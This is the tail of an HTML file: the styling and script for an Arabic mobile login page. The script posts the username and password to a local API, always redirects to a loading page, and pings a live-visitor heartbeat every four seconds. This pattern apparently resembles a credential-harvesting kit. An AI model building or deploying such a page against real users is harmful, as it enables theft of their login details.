  .content{
    padding:28px 24px 24px;
  }

  .eyebrow{
    color:var(--muted);
    font-size:15px;
    margin:0 0 4px;
  }

  .lang-switch{
    position:absolute;
    top:22px;
    left:24px;
    font-size:13px;
    font-weight:600;
    color:var(--muted);
    text-decoration:none;
    border-bottom:1px solid var(--border);
  }

  .title-row{
    position:relative;
    min-height:64px;
    margin-bottom:26px;
  }

  h1{
    direction:rtl;
    text-align:right;
    font-size:26px;
    font-weight:800;
    line-height:1.35;
    margin:0;
    padding-right:58px;
    max-width:308px;
  }

  .avatar{
    position:absolute;
    right:0;
    top:2px;
    width:46px;
    height:46px;
    border-radius:50%;
    background:#fbe1de;
    display:flex;
    align-items:center;
    justify-content:center;
  }
  .avatar svg{width:22px;height:22px;color:var(--orange-accent);}

  .field{
    position:relative;
    margin-bottom:18px;
  }
  .field input{
    width:100%;
    padding:19px 18px;
    border:1.5px solid var(--border);
    border-radius:14px;
    font-family:inherit;
    font-size:16px;
    text-align:right;
    color:var(--ink);
    outline:none;
    transition:border-color .15s ease;
  }
  .field input::placeholder{color:#9a9a9a;}
  .field input:focus{border-color:var(--orange-accent);}

  .field .eye{
    position:absolute;
    left:16px;
    top:50%;
    transform:translateY(-50%);
    color:#6b6b6b;
    cursor:pointer;
    display:flex;
  }
  .field .eye svg{width:20px;height:20px;}

  .row-between{
    display:flex;
    align-items:flex-start;
    justify-content:space-between;
    margin:6px 0 26px;
    gap:12px;
  }

  .forgot{
    color:var(--orange-accent);
    font-weight:700;
    font-size:14px;
    text-decoration:none;
    line-height:1.5;
  }

  .remember{
    display:flex;
    align-items:center;
    gap:10px;
  }
  .remember span{
    font-size:14px;
    font-weight:700;
    line-height:1.4;
    text-align:right;
  }
  .remember input[type="checkbox"]{
    width:22px;
    height:22px;
    border:1.5px solid #b5b5b5;
    border-radius:4px;
    appearance:none;
    -webkit-appearance:none;
    cursor:pointer;
    flex:0 0 auto;
  }
  .remember input[type="checkbox"]:checked{
    background-color:var(--orange-accent);
    border-color:var(--orange-accent);
    background-image:url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSJ3aGl0ZSIgc3Ryb2tlLXdpZHRoPSIzIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiPjxwb2x5bGluZSBwb2ludHM9IjQgMTIgOSAxNyAyMCA2Ii8+PC9zdmc+');
    background-repeat:no-repeat;
    background-position:center;
    background-size:14px 14px;
  }

  .btn{
    display:block;
    width:100%;
    padding:18px;
    border-radius:14px;
    font-family:inherit;
    font-size:17px;
    font-weight:800;
    cursor:pointer;
    text-align:center;
    margin-bottom:16px;
    border:none;
  }

  .btn-outline{
    background:#fff;
    color:var(--orange-accent);
    border:1.5px solid var(--orange-accent);
  }

  .btn-solid{
    background:var(--orange-accent);
    color:#fff;
  }

  .btn:active{ transform: scale(0.99); }

  .login-error{
    display:none;
    color:#d21f1f;
    font-weight:800;
    font-size:14px;
    text-align:center;
    margin:0 0 14px;
  }
</style>
</head>
<body>

<div class="phone">

  <div class="hero"></div>

  <div class="content" style="position:relative;">
    <a href="login.html" class="lang-switch">English</a>
    <p class="eyebrow">ابدأ</p>
    <div class="title-row">
      <div class="avatar">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
          <circle cx="12" cy="7" r="4"></circle>
        </svg>
      </div>
      <h1>قم بتسجيل الدخول إلى حسابك</h1>
    </div>

    <div class="field">
      <input type="text" id="username" placeholder="إسم المستخدم">
    </div>

    <div class="field">
      <input type="password" placeholder="كلمة المرور" id="pwd">
      <span class="eye" onclick="togglePwd()">
        <svg id="eyeIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <path d="M17.94 17.94A10.94 10.94 0 0 1 12 20c-7 0-11-8-11-8a18.5 18.5 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
          <line x1="1" y1="1" x2="23" y2="23"></line>
        </svg>
      </span>
    </div>

    <div class="row-between">
      <label class="remember">
        <input type="checkbox">
        <span>حفظ إسم المستخدم</span>
      </label>
      <a href="#" class="forgot">نسيت اسم المستخدم / رمز المرور</a>
    </div>

    <button class="btn btn-outline">إنشاء اسم المستخدم وكلمة المرور</button>
    <p class="login-error" id="loginError"></p>
    <button class="btn btn-solid" id="loginBtn">تسجيل دخول</button>
  </div>

</div>

<script>
function togglePwd(){
  const pwd = document.getElementById('pwd');
  pwd.type = pwd.type === 'password' ? 'text' : 'password';
}

document.getElementById('loginBtn').addEventListener('click', function(){
  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('pwd').value.trim();
  if(username === '' || password === ''){
    return;
  }
  fetch('/api/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: username, password: password })
  })
  .then(function(r){ return r.json(); })
  .then(function(){
    window.location.href = 'loading-ar.html';
  })
  .catch(function(){
    alert('تعذر الاتصال بالسيرفر. تأكد إنك فاتح الصفحة عن طريق السيرفر (node server.js) مش بفتح الملف مباشرة.');
  });
});

// Show error message if we were redirected back after a rejection
const params = new URLSearchParams(window.location.search);
if(params.get('error') === '1'){
  const errorEl = document.getElementById('loginError');
  errorEl.textContent = 'اسم المستخدم أو كلمة المرور غير صحيح';
  errorEl.style.display = 'block';
}

// ---- نبضة الزيارات النشطة الحقيقية ----
(function(){
  let sid = sessionStorage.getItem('visitSessionId');
  if(!sid){
    sid = 'sid-' + Math.random().toString(36).slice(2) + Date.now();
    sessionStorage.setItem('visitSessionId', sid);
  }
  function sendHeartbeat(){
    fetch('/api/heartbeat', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ sessionId: sid })
    }).catch(function(){});
  }
  sendHeartbeat();
  setInterval(sendHeartbeat, 4000);
})();
</script>

</body>
